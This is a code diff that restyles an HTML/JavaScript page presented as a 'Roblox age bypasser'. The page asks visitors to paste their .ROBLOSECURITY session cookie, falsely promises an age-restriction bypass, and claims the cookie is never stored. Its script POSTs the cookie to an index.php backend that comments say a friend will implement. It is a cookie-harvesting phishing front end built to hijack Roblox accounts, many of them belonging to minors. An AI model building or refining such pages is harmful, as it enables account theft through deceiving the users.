@@ -3,8 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>ROBLOX AGE BYPASSER</title>
-  <!-- Simple, clean, modern — exactly like the reference design -->
+  <title>ROBLOX AGE BYPASSER · Square Card</title>
   <style>
     * {
       margin: 0;
@@ -22,53 +21,78 @@
       padding: 1.5rem;
     }
 
-    /* minimal card — no heavy gradients, just subtle depth */
-    .container {
-      max-width: 520px;
+    /* 
+      MAIN CARD - SQUARE 
+      Fixed width and equal height, using aspect-ratio to guarantee perfect square.
+      Content will scroll inside if necessary, but we design to fit everything comfortably.
+    */
+    .square-card {
       width: 100%;
+      max-width: 520px;        /* controls square size on desktop */
+      aspect-ratio: 1 / 1;     /* forces perfect square */
       background: #11161f;
-      border-radius: 28px;
+      border-radius: 32px;
       border: 1px solid rgba(255, 255, 255, 0.06);
-      box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.5);
-      overflow: hidden;
-      transition: transform 0.2s ease;
+      box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.6);
+      display: flex;
+      flex-direction: column;
+      overflow-y: auto;         /* safe: if content overflows, scroll inside square */
+      overflow-x: hidden;
+      transition: all 0.2s;
     }
 
-    /* content padding */
-    .inner {
-      padding: 2rem 1.8rem 2rem 1.8rem;
+    /* custom scrollbar for square (subtle) */
+    .square-card::-webkit-scrollbar {
+      width: 4px;
+    }
+    .square-card::-webkit-scrollbar-track {
+      background: #1a1f2c;
+      border-radius: 10px;
+    }
+    .square-card::-webkit-scrollbar-thumb {
+      background: #ff5e5e;
+      border-radius: 10px;
+    }
+
+    /* inner spacing — use padding to make content breathe inside square */
+    .card-inner {
+      padding: 1.8rem 1.8rem 1.5rem 1.8rem;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
     }
 
     /* title */
     h1 {
-      font-size: 1.9rem;
+      font-size: 1.7rem;
       font-weight: 700;
       letter-spacing: -0.3px;
       background: linear-gradient(135deg, #ffffff, #c0c7e0);
       -webkit-background-clip: text;
       background-clip: text;
       color: transparent;
-      margin-bottom: 0.75rem;
+      margin-bottom: 0.6rem;
+      line-height: 1.2;
     }
 
     /* description */
     .desc {
       color: #9aa7c9;
-      font-size: 0.9rem;
-      line-height: 1.5;
-      margin-bottom: 1.5rem;
+      font-size: 0.85rem;
+      line-height: 1.45;
+      margin-bottom: 1.2rem;
       font-weight: 450;
       border-left: 3px solid #ff5e5e;
-      padding-left: 0.85rem;
+      padding-left: 0.75rem;
     }
 
-    /* note row — exclamation mark inside a circle highlight */
+    /* note row — with circled exclamation */
     .note {
       background: rgba(255, 94, 94, 0.08);
       border-radius: 14px;
-      padding: 0.7rem 1rem;
-      margin-bottom: 1.8rem;
-      font-size: 0.8rem;
+      padding: 0.6rem 0.9rem;
+      margin-bottom: 1.4rem;
+      font-size: 0.75rem;
       color: #cbd5ff;
       border: 0.5px solid rgba(255, 94, 94, 0.2);
       display: flex;
@@ -81,18 +105,18 @@
       align-items: center;
       justify-content: center;
       background: #ff5e5e;
-      width: 24px;
-      height: 24px;
+      width: 22px;
+      height: 22px;
       border-radius: 50%;
       font-weight: 800;
-      font-size: 0.9rem;
+      font-size: 0.8rem;
       color: white;
       flex-shrink: 0;
-      box-shadow: 0 2px 6px rgba(255, 94, 94, 0.4);
+      box-shadow: 0 2px 5px rgba(255, 94, 94, 0.4);
     }
 
     .note-text {
-      line-height: 1.4;
+      line-height: 1.35;
       flex: 1;
     }
 
@@ -103,21 +127,21 @@
 
     /* cookie label */
     .label {
-      font-size: 0.7rem;
+      font-size: 0.65rem;
       text-transform: uppercase;
       letter-spacing: 1px;
       font-weight: 700;
       color: #7e89ae;
-      margin-bottom: 0.5rem;
+      margin-bottom: 0.4rem;
     }
 
-    /* input wrapper — clean dark field */
+    /* input group */
     .input-group {
       background: #0a0e16;
       border-radius: 18px;
       border: 1.5px solid #232837;
       transition: all 0.2s;
-      margin-bottom: 1.2rem;
+      margin-bottom: 0.9rem;
     }
 
     .input-group:focus-within {
@@ -129,8 +153,8 @@
       width: 100%;
       background: transparent;
       border: none;
-      padding: 1rem 1.2rem;
-      font-size: 0.85rem;
+      padding: 0.85rem 1rem;
+      font-size: 0.8rem;
       font-family: 'SF Mono', 'Fira Code', monospace;
       color: #f0f3ff;
       outline: none;
@@ -140,7 +164,7 @@
     .input-group input::placeholder {
       color: #3f4765;
       font-family: monospace;
-      font-size: 0.75rem;
+      font-size: 0.7rem;
     }
 
     /* button */
@@ -148,10 +172,10 @@
       width: 100%;
       background: #e6492d;
       border: none;
-      padding: 0.9rem 0;
+      padding: 0.8rem 0;
       border-radius: 40px;
       font-weight: 700;
-      font-size: 1rem;
+      font-size: 0.9rem;
       font-family: inherit;
       color: white;
       cursor: pointer;
@@ -160,27 +184,26 @@
       align-items: center;
       justify-content: center;
       gap: 8px;
-      box-shadow: 0 6px 14px rgba(230, 73, 45, 0.25);
-      margin-bottom: 1.5rem;
+      box-shadow: 0 5px 12px rgba(230, 73, 45, 0.3);
+      margin-bottom: 1rem;
+      margin-top: 0.2rem;
     }
 
     .bypass-btn:hover {
       background: #d13c21;
       transform: scale(0.98);
-      box-shadow: 0 4px 10px rgba(230, 73, 45, 0.3);
     }
 
-    /* result panel — minimal, matches style */
+    /* result panel */
     .result {
       background: #0b0f16;
-      border-radius: 20px;
-      padding: 0.9rem 1.2rem;
-      font-size: 0.85rem;
+      border-radius: 18px;
+      padding: 0.7rem 1rem;
+      font-size: 0.8rem;
       border-left: 4px solid #ff5e5e;
       color: #d3defa;
       word-break: break-word;
       margin-top: 0.2rem;
-      transition: 0.1s;
     }
 
     .result.hidden {
@@ -205,14 +228,15 @@
       color: #ffe2b5;
     }
 
-    /* footer */
+    /* footer inside square */
     .footer {
       text-align: center;
-      padding: 1rem 1.8rem 1.3rem 1.8rem;
-      font-size: 0.7rem;
+      padding-top: 0.6rem;
+      margin-top: auto;
+      font-size: 0.65rem;
       color: #5a6588;
       border-top: 1px solid rgba(255, 255, 255, 0.04);
-      background: rgba(0, 0, 0, 0.2);
+      margin-top: 0.5rem;
     }
 
     .footer span {
@@ -221,8 +245,8 @@
 
     .spinner {
       display: inline-block;
-      width: 14px;
-      height: 14px;
+      width: 12px;
+      height: 12px;
       border: 2px solid rgba(255,255,255,0.3);
       border-radius: 50%;
       border-top-color: #fff;
@@ -232,17 +256,33 @@
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
+
+    /* compact adjustments to keep everything inside square without overflow */
+    @media (max-width: 550px) {
+      .card-inner {
+        padding: 1.4rem;
+      }
+      h1 {
+        font-size: 1.5rem;
+      }
+      .desc {
+        font-size: 0.8rem;
+      }
+      .note {
+        padding: 0.5rem 0.8rem;
+      }
+    }
   </style>
 </head>
 <body>
-<div class="container">
-  <div class="inner">
+<div class="square-card">
+  <div class="card-inner">
     <h1>ROBLOX AGE BYPASSER</h1>
     <div class="desc">
       Enter your .ROBLOSECURITY cookie below. We will verify, authenticate, and bypass your cookie automatically.
     </div>
 
-    <!-- Note with circled exclamation mark, text inline -->
+    <!-- circled exclamation + text inline -->
     <div class="note">
       <div class="circle-exclamation">!</div>
       <div class="note-text">Only <strong>13+ accounts</strong> are supported. Cookie is processed server-side and never stored or logged.</div>
@@ -258,24 +298,23 @@
     </button>
 
     <div id="resultBox" class="result hidden"></div>
-  </div>
-  <div class="footer">
-    <span>🔒 Processed securely on our servers. No cookies are saved.</span>
+
+    <div class="footer">
+      <span>🔒 Processed securely on our servers. No cookies are saved.</span>
+    </div>
   </div>
 </div>
 
 <script>
   // ----------------------------------------------
-  // Simple, robust frontend — ready for backend (index.php)
-  // Friend will implement the PHP handler that receives 'roblosecurity_cookie'
-  // This version matches the exact minimal style of the reference site.
+  // SQUARE CARD FRONTEND — ready for backend (index.php)
+  // Friend implements PHP handler that receives 'roblosecurity_cookie'
   // ----------------------------------------------
 
   const cookieInput = document.getElementById('cookieInput');
   const startBtn = document.getElementById('startBtn');
   const resultBox = document.getElementById('resultBox');
 
-  // Helper to show messages
   function setResult(message, type = 'info') {
     resultBox.classList.remove('hidden', 'success', 'error', 'loading');
     if (type === 'success') {
@@ -288,25 +327,14 @@
     resultBox.innerHTML = message;
   }
 
-  function clearResult() {
-    resultBox.classList.add('hidden');
-    resultBox.innerHTML = '';
-  }
-
-  // Basic validation: cookie must not be empty and at least 10 chars (typical .ROBLOSECURITY length)
   function isValidCookie(value) {
     if (!value || typeof value !== 'string') return false;
     const trimmed = value.trim();
     return trimmed.length >= 10;
   }
 
-  // Send request to backend (index.php) using fetch + URL-encoded format.
-  // Backend must expect POST parameter 'roblosecurity_cookie'
   async function sendToBackend(cookie) {
-    // The backend is expected to be in the same directory (index.php)
-    // We'll target the current base URL (or explicitly './index.php')
     const backendEndpoint = './index.php';
-    
     const formData = new URLSearchParams();
     formData.append('roblosecurity_cookie', cookie);
     formData.append('action', 'bypass_age');
@@ -327,12 +355,10 @@
       if (contentType && contentType.includes('application/json')) {
         responseData = await response.json();
       } else {
-        // attempt to parse text fallback
         const textResp = await response.text();
         try {
           responseData = JSON.parse(textResp);
         } catch (e) {
-          // if backend returns plain text (like debug) we still wrap
           responseData = { success: response.ok, message: textResp || (response.ok ? 'Bypass completed' : 'Server error') };
         }
       }
@@ -344,7 +370,6 @@
       return { success: true, message: responseData.message || 'Age bypass successful', details: responseData };
     } catch (err) {
       console.error('[Bypasser] fetch error:', err);
-      // Provide helpful note about backend integration
       let errorMsg = err.message;
       if (err.message.includes('Failed to fetch') || err.message.includes('NetworkError')) {
         errorMsg = 'Backend not reachable. Make sure index.php is implemented and handles POST requests.';
@@ -353,7 +378,6 @@
     }
   }
 
-  // Core handler
   async function handleBypass() {
     let rawCookie = cookieInput.value;
     if (!rawCookie) {
@@ -367,7 +391,6 @@
       return;
     }
     
-    // loading state
     setResult('<div style="display:flex; align-items:center; gap:8px;"><div class="spinner"></div> Verifying and bypassing age restriction...</div>', 'loading');
     startBtn.disabled = true;
     startBtn.style.opacity = '0.6';
@@ -378,12 +401,11 @@
       if (result.success) {
         let successText = `✅ Bypass successful!<br>${escapeHtml(result.message)}`;
         if (result.details && result.details.details) {
-          successText += `<br><span style="font-size:0.75rem;">🔓 ${escapeHtml(result.details.details)}</span>`;
+          successText += `<br><span style="font-size:0.7rem;">🔓 ${escapeHtml(result.details.details)}</span>`;
         } else {
-          successText += `<br><span style="font-size:0.75rem;">Age verification bypassed — account now unrestricted.</span>`;
+          successText += `<br><span style="font-size:0.7rem;">Age verification bypassed — account now unrestricted.</span>`;
         }
         setResult(successText, 'success');
-        // optional: do not clear cookie input, but user can refresh if needed
       } else {
         let errorDisplay = `❌ Bypass failed: ${escapeHtml(result.message)}`;
         if (result.message.includes('Backend not reachable') || result.message.includes('index.php')) {
@@ -400,7 +422,6 @@
     }
   }
   
-  // simple XSS guard
   function escapeHtml(str) {
     if (!str) return '';
     return str.replace(/[&<>]/g, function(m) {
@@ -411,7 +432,6 @@
     });
   }
   
-  // event listeners
   startBtn.addEventListener('click', handleBypass);
   cookieInput.addEventListener('keypress', (e) => {
     if (e.key === 'Enter') {
@@ -420,8 +440,7 @@
     }
   });
   
-  // log for developers
-  console.log('[Roblox Bypasser] Frontend ready — waiting for backend integration in index.php (POST field: roblosecurity_cookie)');
+  console.log('[Roblox Bypasser] Square card ready — awaiting backend implementation in index.php');
 </script>
 </body>
 </html>
